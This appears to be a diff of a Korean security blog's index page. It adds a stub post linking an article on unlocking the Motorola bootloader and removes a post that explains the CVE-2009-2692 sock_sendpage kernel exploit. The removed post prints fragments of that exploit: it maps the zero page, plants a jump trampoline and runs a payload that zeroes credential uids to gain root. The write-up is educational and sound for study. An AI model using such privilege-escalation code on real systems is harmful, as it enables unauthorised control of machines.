@@ -9,7 +9,8 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="shellphish team 에서 github 에 공개한 Educational Heap Exploitation 을 정리한다. Understanding glibc malloc first_fit.c first_fit.c malloc() allocator 의 &hellip;">
+  <meta name="description" content="이번에는 좀 오래되었지만, Azimuth Security 블로그의 글을 정리해본다. Unlocking the Motorola Bootloader
+">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +66,37 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2016/02/12/unlocking-the-motorola-bootloader-by-azimuth-security/">Unlocking the Motorola Bootloader by Azimuth Security</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-02-12T10:12:12+09:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>10:12 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>이번에는 좀 오래되었지만, Azimuth Security 블로그의 글을 정리해본다.</p>
+
+<p><a href="http://blog.azimuthsecurity.com/2013/04/unlocking-motorola-bootloader.html?m=1">Unlocking the Motorola Bootloader</a></p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -605,91 +637,6 @@
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2016/01/11/sock-sendpage/">Sock_sendpage</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2016-01-11T14:42:27+09:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>2:42 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>CVE-2009-2692, sock_sendpage 에서 벌어지는 NULL pointer deref 버그를 정리한다. 발견자가 Tarvis Ormandy 인지 Brad Spengler 인지는 이런저런 문서를 읽어봐도 잘 모르겠다.</p>
-
-<p>Exploit 자체는 꽤 클래식해서 정리해놓을 가치가 있다고 생각한다.</p>
-
-<p><a href="http://http://downloads.securityfocus.com/vulnerabilities/exploits/36038-5.c">exploit.c</a></p>
-
-<h4>Exploit</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>...
-</span><span class='line'>if ((zero_page = mmap(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,0,0)) == MAP_FAILED) {
-</span><span class='line'>  ...
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>0x0 에 4096 bytes 짜리 메모리 페이지를 할당한다.</p>
-
-<p>그리고, payload 를 담고있는 변수의 주소를 0x00000002,0x3,0x4,0x5 에 깐다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>*(char *)0x00000000 = 0xff;
-</span><span class='line'>*(char *)0x00000001 = 0x25;
-</span><span class='line'>*(unsigned long *)0x00000002 = (unsigned long)&kernel;
-</span><span class='line'>*(char *)0x00000006 = 0xc3;</span></code></pre></td></tr></table></div></figure>
-
-
-<p>버그가 trigger 되면 <code>fp = *(unsigned long)(*(unsigned long)((0x00000000)-&gt;0x2)); (*fp)();</code> 하는 모양.</p>
-
-<p>Kernel priv. 로 돌아가는 페이로드는 다음과 같다. cred structure 에서 uid 들을 고치는 페이로드.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>while (pcb_task_struct) {
-</span><span class='line'>  if (pcb_task_struct[0] == uid && pcb_task_struct[1] == uid &&
-</span><span class='line'>      pcb_task_struct[2] == uid & pcb_task_struct[3] == uid &&
-</span><span class='line'>      ...) {
-</span><span class='line'>      pcb_task_struct[0] = [1] = ... = [7] = 0;
-</span><span class='line'>      break;
-</span><span class='line'>  }   
-</span><span class='line'>  pcb_task_struct++;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>그런데 왜 NULL porinter 를 deref 하게 되는지는 너무 오래된 버그라서 큰 의미는 없을 것 같다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/3">&larr; Older</a>
@@ -707,6 +654,10 @@
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/06/13/poison-null-byte/">Poison NULL Byte</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/06/13/control-flow-enforcement-technology-preview/">Control-flow Enforcement Technology Preview</a>
       </li>
     
@@ -720,10 +671,6 @@
     
       <li class="post">
         <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/03/25/bleichenbacher/">Bleichenbacher</a>
       </li>
     
   </ul>
